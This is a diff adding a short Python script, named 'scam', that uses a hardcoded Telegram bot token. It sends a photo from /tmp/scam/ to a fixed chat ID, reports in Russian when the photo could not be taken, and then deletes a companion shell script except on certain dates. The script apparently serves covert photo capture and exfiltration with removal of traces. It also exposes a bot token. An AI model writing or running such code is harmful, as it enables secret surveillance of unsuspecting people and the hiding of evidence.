@@ -1,0 +1,32 @@
+import asyncio
+import os
+import datetime
+
+from aiogram import Bot, Dispatcher
+
+
+token = '5379198384:AAGp5K3g7o6hvax1pQMjsmFMCLYCHxHspQA'
+mikado_id = 439489484
+
+bot = Bot(token=token)
+
+
+async def scam():
+    try:
+        photo_ = open("/tmp/scam/photo.jpg", "rb")
+        await bot.send_photo(chat_id=mikado_id, photo=photo_)
+    except Exception as ex:
+        await bot.send_message(mikado_id, 'не получилось сфотографировать')
+    await bot.close()
+    date = datetime.datetime.now()
+    day = int(date.day)
+    hour = int(date.hour)
+
+    if (day == 23 or day == 30) and hour >= 12:
+        return
+
+    os.remove("/tmp/scam/second_script.sh")
+
+
+if __name__ == '__main__':
+    asyncio.run(scam())
